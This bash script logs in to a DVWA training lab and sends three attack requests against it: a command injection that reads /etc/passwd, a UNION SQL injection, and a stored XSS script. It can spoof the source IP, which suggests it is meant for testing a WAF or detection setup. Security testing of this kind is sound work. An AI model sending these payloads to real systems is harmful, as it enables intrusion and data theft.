#!/bin/bash

log_message () {
	SEVERITY=$1
	MESSAGE="$2"
	echo `date`: "$SEVERITY" "$MESSAGE"
}

export DVWA_USERNAME=admin

export DVWA_PASSWORD=password

export DOMAIN_NAME=dvwa.localhost

export SERVER_NAME

export AUTH_COOKIE

export SOURCE_IP


while getopts :hu:p:d:s:i: option
do
        case "$option" in
                h)
                        usage;
                        exit 1
                        ;;
                u)
                        DVWA_USERNAME=$OPTARG;
                        ;;
                p)
                        DVWA_PASSWORD=$OPTARG;
                        ;;
                d)
                        DOMAIN_NAME=$OPTARG;
                        ;;
                s)
                        SERVER_NAME=$OPTARG;
                        ;;
                i)
                        SOURCE_IP="-H X-Forwarded-For:$OPTARG"
                        ;;
                *)
                        echo "Hmm, an invalid option was received."
                        usage
                        exit 1
                        ;;
        esac
done

if [ -z "$SERVER_NAME" ]; then
	SERVER_NAME=$DOMAIN_NAME
fi

login () {

	log_message INFO "Retrieving the session ID..."
	curl $SOURCE_IP -x$SERVER_NAME:80 "http://$DOMAIN_NAME/login.php" -v > /tmp/tmp.txt 2>&1

	PHPSESSION=`cat /tmp/tmp.txt |grep PHPSESS|tail -1|cut -f3 -d" "|grep 'PHPSESSID='`

	if [ -z "$PHPSESSION" ]; then
		log_message CRTICAL "Failed to retrieve a session ID - aborting..."
		exit 1
	fi
	log_message INFO "Retrieved session ID \"$PHPSESSION\""

	USER_TOKEN=`cat /tmp/tmp.txt |grep user_token|awk '{print $4}'|cut -f2 -d=|cut -f2 -d\'`

	if [ -z "$USER_TOKEN" ]; then
		log_message CRITICAL "Failed to retrieve a user token - aborting..."
		exit 1
	fi

	log_message INFO "Logging in to the DVWA application..."
	curl $SOURCE_IP -H "Cookie: $PHPSESSION security=low" -x$SERVER_NAME:80 "http://$DOMAIN_NAME/login.php" -X POST -d "username=$DVWA_USERNAME&password=$DVWA_PASSWORD&Login=Login&user_token=$USER_TOKEN" -v -H "Content-Type: application/x-www-form-urlencoded"

}

setup() {
	log_message INFO "Resetting the database..."

	curl $SOURCE_IP -H "Cookie: $PHPSESSION security=low" -x$SERVER_NAME:80 "http://$DOMAIN_NAME/setup.php" -X POST -d"create_db=Create+%2F+Reset+Database&user_token=$USER_TOKEN" -H "Content-Type: application/x-www-form-urlencoded" -v 2>&1


}

rce () {
	log_message INFO "Trying RCE exploit..."

	curl $SOURCE_IP -H "Cookie: $PHPSESSION security=low" -x$SERVER_NAME:80 "http://$DOMAIN_NAME/vulnerabilities/exec/" -X POST -d"ip=8.8.8.8%3B+cat+%2Fetc%2Fpasswd&Submit=Submit" -H "Content-Type: application/x-www-form-urlencoded" 2>&1

}

sqli () {
	log_message INFO "Trying SQLi exploit..."
	curl $SOURCE_IP -H "Cookie: $PHPSESSION security=low" -x$SERVER_NAME:80 "http://$DOMAIN_NAME/vulnerabilities/sqli/?id=%25%27+or+0%3D0+union+select+null%2C+version%28%29+%23&Submit=Submit" 2>&1
}

stored_xss () {
	log_message INFO "Trying Stored XSS  exploit..."
	curl $SOURCE_IP -H "Cookie: $PHPSESSION security=low" -x$SERVER_NAME:80 "http://$DOMAIN_NAME/vulnerabilities/xss_s/" -X POST -d"txtName=werewrwer&mtxMessage=%3Cscript%3Ealert%28%22This+is+a+XSS+est%22%29%3C%2Fscript%3E&btnSign=Sign+Guestbook" -H "Content-Type: application/x-www-form-urlencoded" 2>&1
}

login

setup

log_message INFO "Wait for 20 seconds to allow the application to reset the database..."
sleep 10

login

rce

sqli

stored_xss

